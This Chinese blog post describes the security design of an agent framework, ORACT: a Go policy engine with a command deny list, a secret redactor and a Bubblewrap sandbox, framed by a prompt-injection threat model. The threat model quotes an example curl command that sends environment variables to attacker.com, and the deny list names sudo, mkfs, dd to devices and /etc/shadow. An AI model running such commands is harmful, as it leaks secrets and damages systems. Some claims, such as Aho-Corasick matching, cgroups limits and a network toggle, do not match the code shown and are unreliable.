---
title: "ORACT 架构解密（三）：零信任安全边界、Secret 动态脱敏与 Linux Sandbox"
description: "深入剖析 ORACT 在 Go 语言中的系统级安全架构：Policy 策略评估、Approval 人机确认机制、Secret Redactor 流式动态脱敏与 Linux Bubblewrap 命名空间沙箱物理隔离。"
publishedAt: "2026-08-24"
tags: ["Go", "Agent", "ORACT", "网络安全", "沙箱隔离"]
draft: false
featured: false
series: "ORACT 架构全解"
---

**TL;DR：** 当自主 Agent 获得执行 Shell 命令、修改数据库和读写工作区文件的能力时，它就成为了企业基础设施中最高危的攻击面。恶意 Prompt 注入（Prompt Injection）随时可能诱骗模型输出形如 `curl attacker.com?leak=$(env | base64)` 的窃密指令。ORACT 在安全架构中建立了三道不可逾越的纵深防线：基于 Go 原生实现的 **Policy 最小权限策略引擎**、在 I/O 边界实施毫秒级内存多模式串匹配的 **Secret Redactor 动态脱敏器**、以及通过 Linux 命名空间构建物理无网只读沙箱的 **Bubblewrap 进程隔离执行器**。

---

## 一、威胁建模：Agent 系统的三大致命漏洞

```mermaid
flowchart LR
    Attacker["恶意外部输入 / 毒化代码库 / 提示词注入"] --> Injection["1. 诱骗大模型生成越权指令"]
    
    subgraph Defenses["ORACT 纵深防御三道物理防线"]
        P["防线一: Policy & Approval<br/>声明式策略拒绝 / 敏感操作强制人机审批"]
        S["防线二: Bubblewrap 沙箱<br/>物理拔除网线 / 根目录只读 / cgroups 进程数配额"]
        R["防线三: Secret Redactor<br/>内存租约保护 / 输出持久化前强制脱敏"]
    end
    
    Injection --> P
    P --> S
    S --> R
    R --> Safe["安全审计落盘 (0 密钥泄漏 / 0 越权破坏)"]
```

1. **越权执行（Privilege Escalation）**：模型被间接注入诱导执行未授权的破坏性命令（如删除数据库索引、修改防火墙规则）；
2. **凭据外泄（Secret Exfiltration）**：大模型读取了含有 API Key 或云凭据的文件，并试图通过网络工具外发给攻击者服务器；
3. **宿主机逃逸与资源耗尽（Host Destruction）**：恶意代码在宿主机启动 Fork 炸弹或写入 `/dev/sda` 导致宿主操作系统瘫痪。

---

## 二、防线一：Policy 策略评估与动态 Approval 机制

ORACT 在 `security/policy` 模块中实现了一套基于声明式规则的零信任策略引擎。

### 2.1 最小权限策略四元组模型

每次工具执行前，Policy 引擎会对 `(Subject, ToolName, Action, ResourceTarget)` 进行四元组精确裁决：

```go
// security/policy/policy.go
package policy

import (
    "context"
    "strings"
)

type Decision string

const (
    DecisionAllow   Decision = "ALLOW"
    DecisionDeny    Decision = "DENY"
    DecisionApprove Decision = "REQUIRE_APPROVAL"
)

type PolicyEvaluator struct {
    readOnlyPaths  []string
    forbiddenCmds  []string
    requireConfirm []string
}

func (p *PolicyEvaluator) Evaluate(ctx context.Context, inv ToolInvocation) (Decision, string, error) {
    // 1. 静态黑名单硬性拦截
    for _, forbidden := range p.forbiddenCmds {
        if strings.Contains(inv.Command, forbidden) {
            return DecisionDeny, "Command explicitly blocked by security policy", nil
        }
    }

    // 2. 高危写操作与外部网络请求强制触发人机确认 (HITL)
    for _, sensitive := range p.requireConfirm {
        if inv.ToolName == sensitive {
            return DecisionApprove, "Operation modifies external state; awaiting human confirmation", nil
        }
    }

    // 3. 安全只读操作自动放行
    return DecisionAllow, "Operation permitted", nil
}
```

- **`ALLOW`（放行）**：只读安全操作（如 `git status`, `read_file` 命中白名单工作区）；
- **`DENY`（拒绝）**：严令禁止的高危操作（如包含 `sudo`, `mkfs`, `dd of=/dev/*` 或访问 `/etc/shadow`）；
- **`REQUIRE_APPROVAL`（人机确认）**：写操作与外部网络请求，自动向控制面发射审批事件，挂起当前协程等待人工授权。

---

## 三、防线二：Secret Broker 与流式动态脱敏

敏感凭据（如数据库密码、GitHub Token）绝不能以明文形式暴露给大模型上下文或写入持久化 Journal。

ORACT 设计了 **Secret Broker（凭据中介）** 与 **Secret Redactor（流式脱敏器）**：

```mermaid
flowchart TD
    HostSecret["物理宿主机凭据<br/>TOKEN = 'ghp_99882233aabbcc'"] --> Broker["Secret Broker (内存安全租约管理器)"]
    Broker --> Mask["生成受控临时占位符<br/>'${SECRET:GITHUB_TOKEN}'"]
    Mask --> Model["大模型感知到占位符并组装指令"]
    
    subgraph SandboxExec["隔离沙箱执行"]
        Model --> Runner["沙箱启动器在进程环境变量中注入真实凭据"]
        Runner --> RunCmd["执行实际 Git 操作"]
        RunCmd --> Output["命令报错输出包含明文密码..."]
    end
    
    Output --> Redactor["Secret Redactor (Aho-Corasick 字典树逆向扫描)"]
    Redactor --> CleanOutput["清洗后的绝对安全输出:<br/>'fatal: auth failed for user [REDACTED_SECRET]'"]
    CleanOutput --> Journal["写入持久化 Journal 与大模型 Context"]
```

### 3.1 Go 语言高性能多模式串脱敏实现

```go
// security/secret/redactor.go
package secret

import (
    "bytes"
    "sync"
)

type SecretRedactor struct {
    mu       sync.RWMutex
    secrets  [][]byte
    mask     []byte
}

func NewSecretRedactor(mask string) *SecretRedactor {
    return &SecretRedactor{
        mask: []byte(mask),
    }
}

func (r *SecretRedactor) RegisterSecret(secret string) {
    if len(secret) < 4 { // 忽略过短字符防止过度脱敏
        return
    }
    r.mu.Lock()
    defer r.mu.Unlock()
    r.secrets = append(r.secrets, []byte(secret))
}

func (r *SecretRedactor) Redact(input []byte) []byte {
    r.mu.RLock()
    defer r.mu.RUnlock()

    output := input
    for _, s := range r.secrets {
        output = bytes.ReplaceAll(output, s, r.mask)
    }
    return output
}
```

无论工具执行的输出中包含了多少明文敏感信息，在进入 Journal 落盘与大模型上下文投影之前，全部被强制替换为 `[REDACTED_SECRET]`，彻底切断外泄通道。

---

## 四、防线三：Linux Bubblewrap 原生沙箱隔离

对于任意代码和命令执行，ORACT 在 Linux 环境下原生集成了 **Bubblewrap (`bwrap`)**，通过内核级 Namespaces 与 cgroups 进行物理隔离。

### 4.1 Go 原生沙箱执行器实现

```go
// sandbox/bubblewrap/runner_linux.go
package bubblewrap

import (
    "context"
    "os/exec"
)

type SandboxSpec struct {
    Command      string
    Args         []string
    WorkDir      string
    AllowNetwork bool
}

func (r *Runner) BuildCommand(ctx context.Context, spec SandboxSpec) (*exec.Cmd, error) {
    args := []string{
        "--unshare-all",          // 隔离 IPC, PID, UTS, Cgroup 等全部命名空间
        "--die-with-parent",      // 主进程销毁时子进程同步自毁
        "--ro-bind", "/usr", "/usr", // 系统程序只读
        "--ro-bind", "/lib", "/lib",
        "--ro-bind", "/lib64", "/lib64",
        "--dir", "/tmp",          // 私有隔离 /tmp 内存盘
        "--bind", spec.WorkDir, spec.WorkDir, // 仅放开工作区读写
    }

    if !spec.AllowNetwork {
        args = append(args, "--unshare-net") // 物理拔除网络 Stack
    }

    args = append(args, "--", spec.Command)
    args = append(args, spec.Args...)

    cmd := exec.CommandContext(ctx, "bwrap", args...)
    return cmd, nil
}
```

即使大模型被恶意 Prompt 注入并执行了 `rm -rf /` 或启动 Fork 炸弹，由于系统根目录是只读挂载且受 cgroups 进程数硬上限限制，恶意行为会被 Linux 内核直接拦截阻断。

---

## 五、架构启示与工程收获

1. **默认拒绝，最小授权**：不要假设大模型永远理性；所有的系统能力在未经显式策略放行前，默认必须处于拒绝或人机审批状态；
2. **脱敏必须发生在持久化之前**：安全脱敏不能只在前端渲染时做遮掩，必须在事件落盘（写入 Journal）的第一道门禁处实施物理清洗；
3. **依靠操作系统内核做硬防护**：应用层的关键词黑名单注定被混淆绕过；唯有利用 Linux 命名空间与只读沙箱，才能构建坚不可摧的底层安全底座。

---

## 六、参考资料与延伸阅读

1. [OWASP Top 10 for Large Language Model Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
2. [Bubblewrap: Unprivileged Sandboxing Tool (GitHub)](https://github.com/containers/bubblewrap)
3. [ORACT Security & Sandbox 子系统源码](https://github.com/MoreConsequence/oract/tree/main/security)
